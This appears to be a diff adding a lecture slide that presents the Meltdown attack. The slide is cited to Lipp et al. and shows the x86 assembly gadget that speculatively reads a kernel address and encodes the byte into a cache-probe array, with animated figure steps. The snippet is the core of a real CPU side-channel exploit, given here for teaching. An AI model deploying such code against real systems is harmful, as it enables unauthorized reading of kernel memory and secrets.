@@ -1,0 +1,31 @@
+
+### Meltdown  {.smaller}
+
+[ from Lipp et al, ‘‘Meltdown: Reading Kernel Memory from User Space’’]{.my-small} <br> <!-- \lstset{
+    language=myasm,
+    style=small,
+    moredelim={**[is][\btHL<2>]{@2}{2@}},
+    moredelim={**[is][\btHL<3>]{@3}{3@}},
+    moredelim={**[is][\btHL<4>]{@4}{4@}},
+    moredelim={**[is][\btHL<5>]{@5}{5@}},
+} -->
+ 
+<pre><code>    // %rcx = kernel address
+    // %rbx = array to load from to cause eviction
+    xor %rax, %rax      // rax &lt;- 0
+retry:
+    // rax &lt;- memory\[kernel address] (segfaults)
+    // but check for segfault done out-of-order on Intel at time
+    <span data-fragment-index="5" class="fragment custom myem-only">movb (%rcx), %al</span>
+    // rax &lt;- memory\[kernel address] * 4096 \[speculated]
+    <span data-fragment-index="2" class="fragment custom myem-only">shl $0xC, %rax</span>
+    <span data-fragment-index="3" class="fragment custom myem-only">jz retry</span>            // not-taken branch
+    // access array\[memory\[kernel address] * 4096]
+    <span data-fragment-index="4" class="fragment custom myem-only">mov (%rbx, %rax), %rbx</span>
+</code></pre>
+ ![](/spectre/texfig/meltdown-code.figure-1.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=1}
+![](/spectre/texfig/meltdown-code.figure-2.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=2}
+![](/spectre/texfig/meltdown-code.figure-3.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=3}
+![](/spectre/texfig/meltdown-code.figure-4.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=4}
+![](/spectre/texfig/meltdown-code.figure-5.svg){.absolute top="0%" left="0%" width=1050 height=600 .my-center  .fragment .fade-in-then-out fragment-index=5}
+
